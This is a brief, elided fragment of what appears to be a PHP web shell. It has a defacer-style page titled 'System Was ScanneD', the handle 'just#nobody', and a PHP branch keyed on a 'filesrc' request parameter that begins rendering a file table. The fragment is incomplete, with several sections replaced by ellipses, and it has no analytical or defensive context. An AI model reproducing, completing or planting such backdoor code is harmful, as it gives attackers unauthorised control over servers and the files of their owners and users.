...
<HTML>
<HEAD>
<title>System Was ScanneD</title>
<style>
body{
    font-family: "Tahoma";
...
<BODY background="http://i.imgur.com/zHNCk2e.gif">
<H1><center>just#nobody</center></H1>
...
if(isset($_GET['filesrc'])){
    ...
    echo '<div id="content"><table width="750" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
